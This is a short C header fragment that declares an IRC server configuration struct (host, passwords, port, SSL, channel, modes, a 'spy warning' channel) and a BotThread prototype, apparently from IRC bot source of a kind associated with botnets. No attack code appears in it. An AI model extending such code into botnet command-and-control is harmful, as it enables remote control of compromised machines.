
typedef struct irc_server {
	char	host[MAX_HOSTNAME];			// The server host
	char	pass[16];					// The server password
	int		port;						// The server port
	BOOL	usessl;						// Is this server/port ssl?
	char	chan[MAX_NICKLEN];			// The channel
	char	chanpass[16];				// The channel pass
#ifndef NO_MODEONCONN
	char	modeonconn[12];				// The modes to set on connect
#endif
#ifndef NO_MODEONJOIN
	char	modeonjoin[12];				// The modes to set on op
#endif

#ifndef NO_SPY_WARNING
	char	warningchan[MAX_NICKLEN];	// The warning channel
#endif
} SERVER;

DWORD WINAPI BotThread(LPVOID param);
